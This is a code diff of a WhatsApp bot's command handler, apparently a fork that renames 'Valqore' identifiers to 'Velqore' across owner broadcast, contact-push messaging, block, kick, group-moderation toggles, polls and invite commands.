-                await ValqoreInc.groupLeave(m.chat)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (!m.isGroup) return VelqoreStickGroup()
+                replygcVelqore('Bye Everyone 🥺')
+                await VelqoreInc.groupLeave(m.chat)
             break
             case 'bc':
             case 'broadcast': {
-               if (!ValqoreTheCreator) return ValqoreStickOwner()
-               if (!text) return replygcValqore('Text?')
+               if (!VelqoreTheCreator) return VelqoreStickOwner()
+               if (!text) return replygcVelqore('Text?')
                let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`
                for (let i of Object.keys(global.db.data.users)) {
                await sleep(1500)
                   if (/image/.test(mime)) {
                      var media = await quoted.download()
-                     await ValqoreInc.sendMessage(i, { 
+                     await VelqoreInc.sendMessage(i, { 
                         image:media,
                         caption: teksnya
                      })
                   } else if (/video/.test(mime)) {
                      var media = await quoted.download()
-                     await ValqoreInc.sendMessage(i, {
+                     await VelqoreInc.sendMessage(i, {
                         video: media,
                         caption: teksnya
                      })
                   } else if (text) {
-                     await ValqoreInc.sendMessage(i, {
+                     await VelqoreInc.sendMessage(i, {
                         text: teksnya
                      })
                   }
                }
-               replygcValqore(`Success ${command} To ${Object.keys(global.db.data.users).length} Users`)
+               replygcVelqore(`Success ${command} To ${Object.keys(global.db.data.users).length} Users`)
             }
             break
             case 'pushcontact': {
-    if (!ValqoreTheCreator) return ValqoreStickOwner()
-      if (!m.isGroup) return replygcValqore(`The feature works only in grup`)
-    if (!text) return replygcValqore(`text?`)
+    if (!VelqoreTheCreator) return VelqoreStickOwner()
+      if (!m.isGroup) return replygcVelqore(`The feature works only in grup`)
+    if (!text) return replygcVelqore(`text?`)
     let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
-    replygcValqore(`Success in pushing the message to contacts`)
+    replygcVelqore(`Success in pushing the message to contacts`)
     for (let pler of mem) {
-    ValqoreInc.sendMessage(pler, { text: q})
+    VelqoreInc.sendMessage(pler, { text: q})
      }  
-     replygcValqore(`Done`)
+     replygcVelqore(`Done`)
       }
       break
 case "pushcontactv2":{
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-if (!q) return replygcValqore(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
-await ValqoreStickWait()
-const metadata2 = await ValqoreInc.groupMetadata(q.split("|")[0])
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+if (!q) return replygcVelqore(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
+await VelqoreStickWait()
+const metadata2 = await VelqoreInc.groupMetadata(q.split("|")[0])
 const halss = metadata2.participants
 for (let mem of halss) {
-ValqoreInc.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
+VelqoreInc.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
 await sleep(5000)
 }
-replygcValqore(`Success`)
+replygcVelqore(`Success`)
 }
 break
 case 'block': case 'ban': {
-		if (!ValqoreTheCreator) return ValqoreStickOwner()
+		if (!VelqoreTheCreator) return VelqoreStickOwner()
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-		await ValqoreInc.updateBlockStatus(users, 'block')
-		await replygcValqore(`Done`)
+		await VelqoreInc.updateBlockStatus(users, 'block')
+		await replygcVelqore(`Done`)
 	}
 	break
 	case 'unblock': case 'unban': {
-		if (!ValqoreTheCreator) return ValqoreStickOwner()
+		if (!VelqoreTheCreator) return VelqoreStickOwner()
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-		await ValqoreInc.updateBlockStatus(users, 'unblock')
-		await replygcValqore(`Done`)
+		await VelqoreInc.updateBlockStatus(users, 'unblock')
+		await replygcVelqore(`Done`)
 	}
 	break
             case 'bcgc':
             case 'bcgroup': {
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (!text) return replygcValqore(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
-                let getGroups = await ValqoreInc.groupFetchAllParticipating()
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (!text) return replygcVelqore(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
+                let getGroups = await VelqoreInc.groupFetchAllParticipating()
                 let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                 let anu = groups.map(v => v.id)
-                replygcValqore(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
+                replygcVelqore(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                 for (let i of anu) {
                     await sleep(1500)
                     let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
-                    ValqoreInc.sendMessage(i, {
+                    VelqoreInc.sendMessage(i, {
                         text: a,
                         contextInfo: {
                             externalAdReply: {
@@ -1879,118 +1875,118 @@ case 'block': case 'ban': {
                         }
                     })
                 }
-                replygcValqore(`Successful in sending Broadcast To ${anu.length} Group`)
+                replygcVelqore(`Successful in sending Broadcast To ${anu.length} Group`)
             }
             break
             case 'getcase':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
                 try {
                    const getCase = (cases) => {
-                      return "case" + `'${cases}'` + fs.readFileSync("ValqoreCheems10.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
+                      return "case" + `'${cases}'` + fs.readFileSync("VelqoreCheems10.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                    }
-                   replygcValqore(`${getCase(q)}`)
+                   replygcVelqore(`${getCase(q)}`)
                 } catch {
-                  replygcValqore(`case ${q} not found!`)
+                  replygcVelqore(`case ${q} not found!`)
                 }
             break
             //group
             case 'antibadword':
             case 'antitoxic':{
-		         if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+		         if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].badword = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].badword = false
-                  replygcValqore(`${commad} is disabled`)
+                  replygcVelqore(`${commad} is disabled`)
                }
                }
             break
             case 'react': {
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
                 reactionMessage = {
                     react: {
                         text: args[0],
                         key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                     }
                 }
-                ValqoreInc.sendMessage(m.chat, reactionMessage)
+                VelqoreInc.sendMessage(m.chat, reactionMessage)
             }
             break
            case 'nsfw': {
-if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
+if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
 if (args[0] === "on") {
-if (AntiNsfw) return replygcValqore('Already activated')
+if (AntiNsfw) return replygcVelqore('Already activated')
 ntnsfw.push(from)
 fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
-replygcValqore('Success in turning on nsfw in this group')
-var groupe = await ValqoreInc.groupMetadata(from)
+replygcVelqore('Success in turning on nsfw in this group')
+var groupe = await VelqoreInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ValqoreInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+VelqoreInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
-if (!AntiNsfw) return replygcValqore('Already deactivated')
+if (!AntiNsfw) return replygcVelqore('Already deactivated')
 let off = ntnsfw.indexOf(from)
 ntnsfw.splice(off, 1)
 fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
-replygcValqore('Success in turning off nsfw in this group')
+replygcVelqore('Success in turning off nsfw in this group')
 } else {
-  await replygcValqore(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+  await replygcVelqore(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
   }
   }
   break
             case 'id':{
-            replygcValqore(from)
+            replygcVelqore(from)
            }
           break
             case 'antiaudio':{
-            	if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+            	if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].antiaudio = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].antiaudio = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
                }
             break
             case 'antiforeign':{
-            	if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+            	if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[m.chat].antiforeignnum = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[m.chat].antiforeignnum = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
                }
             break
             case 'poll': {
-	if (!ValqoreTheCreator) return ValqoreStickOwner()
+	if (!VelqoreTheCreator) return VelqoreStickOwner()
             let [poll, opt] = text.split("|")
             if (text.split("|") < 2)
-                return await replygcValqore(
-                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Valqore,Cheems,Doge...`
+                return await replygcVelqore(
+                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Velqore,Cheems,Doge...`
                 )
             let options = []
             for (let i of opt.split(',')) {
                 options.push(i)
             }
-            await ValqoreInc.sendMessage(m.chat, {
+            await VelqoreInc.sendMessage(m.chat, {
                 poll: {
                     name: poll,
                     values: options
@@ -1999,243 +1995,243 @@ if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
         }
         break
             case 'antipoll':{
-            	if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+            	if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].antipoll = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].antipoll = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
                }
             break
             case 'antisticker':{
-            	if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+            	if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].antisticker = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].antisticker = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
                }
             break
             case 'antiimage':{
-            	if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+            	if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].antiimage = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].antiimage = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
                }
             break
             case 'antivideo':{
-            	if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+            	if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].antivideo = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].antivideo = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
                }
             break
             case 'antivirtex':{
-		         if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+		         if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].antivirtex = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].antivirtex = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
                }
             break
             case 'antibot':{
-		         if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+		         if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].antibot = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].antibot = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
                }
             break
             case 'antiviewonce':{
-		         if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+		         if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].antiviewonce = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].antiviewonce = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
                }
             break
             case 'antimedia':{
-		         if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+		         if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].antimedia = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].antimedia = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
                }
             break
             case 'antidocument':{
-		         if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+		         if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].antidocument = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].antidocument = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
                }
             break
             case 'anticontact':{
-		         if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+		         if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].anticontact = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].anticontact = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
                }
             break
             case 'antilocation':{
-		         if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+		         if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].antilocation = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].antilocation = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
                }
             break
             case 'antilink': {
-               if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+               if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].antilink = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].antilink = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
             }
             break
             case 'antilinkgc': {
-               if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+               if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].antilinkgc = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].antilinkgc = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
             }
             break
             case 'welcome':
             case 'left': {
-               if (!m.isGroup) return ValqoreStickGroup()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+               if (!m.isGroup) return VelqoreStickGroup()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   welcome = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   welcome = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
             }
             break
             case 'adminevent': {
-               if (!m.isGroup) return ValqoreStickGroup()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+               if (!m.isGroup) return VelqoreStickGroup()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   adminevent = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   adminevent = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
             }
             break
 case 'groupevent': {
-               if (!m.isGroup) return ValqoreStickGroup()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-               if (args.length < 1) return replygcValqore('on/off?')
+               if (!m.isGroup) return VelqoreStickGroup()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+               if (args.length < 1) return replygcVelqore('on/off?')
                if (args[0] === 'on') {
                   groupevent = true
-                  replygcValqore(`${command} is enabled`)
+                  replygcVelqore(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   groupevent = false
-                  replygcValqore(`${command} is disabled`)
+                  replygcVelqore(`${command} is disabled`)
                }
             }
             break 
             case 'invite': {
-	if (!m.isGroup) return ValqoreStickGroup()
-	if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!text) return replygcValqore(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 918130784851`)
-if (text.includes('+')) return replygcValqore(`Enter the number together without *+*`)
-if (isNaN(text)) return replygcValqore(`Enter only the numbers plus your country code without spaces`)
+	if (!m.isGroup) return VelqoreStickGroup()
+	if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!text) return replygcVelqore(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 918130784851`)
+if (text.includes('+')) return replygcVelqore(`Enter the number together without *+*`)
+if (isNaN(text)) return replygcVelqore(`Enter only the numbers plus your country code without spaces`)
 let group = m.chat
-let link = 'https://chat.whatsapp.com/' + await ValqoreInc.groupInviteCode(group)
-      await ValqoreInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
-        replygcValqore(` An invite link is sent to the user`) 
+let link = 'https://chat.whatsapp.com/' + await VelqoreInc.groupInviteCode(group)
+      await VelqoreInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
+        replygcVelqore(` An invite link is sent to the user`) 
 }
 break
             case 'closetime':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
                 if (args[1] == 'second') {
                     var timer = args[0] * `1000`
                 } else if (args[1] == 'minute') {
@@ -2245,20 +2241,20 @@ break
                 } else if (args[1] == 'day') {
                     var timer = args[0] * `86400000`
                 } else {
-                    return replygcValqore('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
+                    return replygcVelqore('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
                 }
-                replygcValqore(`Close time ${q} starting from now`)
+                replygcVelqore(`Close time ${q} starting from now`)
                 setTimeout(() => {
                     var nomor = m.participant
                     const close = `*Close time* group closed by admin\nnow only admin can send messages`
-                    ValqoreInc.groupSettingUpdate(m.chat, 'announcement')
-                    replygcValqore(close)
+                    VelqoreInc.groupSettingUpdate(m.chat, 'announcement')
+                    replygcVelqore(close)
                 }, timer)
                 break
             case 'opentime':
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isAdmins && !ValqoreTheCreator) return replygcValqore(mess.admin)
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isAdmins && !VelqoreTheCreator) return replygcVelqore(mess.admin)
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
                 if (args[1] == 'second') {
                     var timer = args[0] * `1000`
                 } else if (args[1] == 'minute') {
@@ -2268,43 +2264,43 @@ break
                 } else if (args[1] == 'day') {
                     var timer = args[0] * `86400000`
                 } else {
-                    return replygcValqore('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
+                    return replygcVelqore('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                 }
-                replygcValqore(`Open time ${q} starting from now`)
+                replygcVelqore(`Open time ${q} starting from now`)
                 setTimeout(() => {
                     var nomor = m.participant
                     const open = `*Open time* the group was opened by admin\n now members can send messages`
-                    ValqoreInc.groupSettingUpdate(m.chat, 'not_announcement')
-                    replygcValqore(open)
+                    VelqoreInc.groupSettingUpdate(m.chat, 'not_announcement')
+                    replygcVelqore(open)
                 }, timer)
                 break
             case 'kick':
-                if (!isAdmins && !isGroupOwner && !ValqoreTheCreator) return ValqoreStickAdmin()
-                if (!m.isGroup) return ValqoreStickGroup()
-                if (!isAdmins && !isGroupOwner && !ValqoreTheCreator) return ValqoreStickAdmin()
-                if (!isBotAdmins) return ValqoreStickBotAdmin()
+                if (!isAdmins && !isGroupOwner && !VelqoreTheCreator) return VelqoreStickAdmin()
+                if (!m.isGroup) return VelqoreStickGroup()
+                if (!isAdmins && !isGroupOwner && !VelqoreTheCreator) return VelqoreStickAdmin()
+                if (!isBotAdmins) return VelqoreStickBotAdmin()
                 let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                await ValqoreInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
-                replygcValqore(mess.done)
+                await VelqoreInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
+                replygcVelqore(mess.done)
                 break
                 case "idgroup": case "groupid": {
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-let getGroups = await ValqoreInc.groupFetchAllParticipating()
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+let getGroups = await VelqoreInc.groupFetchAllParticipating()
 let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
 let anu = groups.map((v) => v.id)
 let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let x of anu) {
-let metadata2 = await ValqoreInc.groupMetadata(x)
+let metadata2 = await VelqoreInc.groupMetadata(x)
 teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
 }
-replygcValqore(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
+replygcVelqore(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
 }
 break
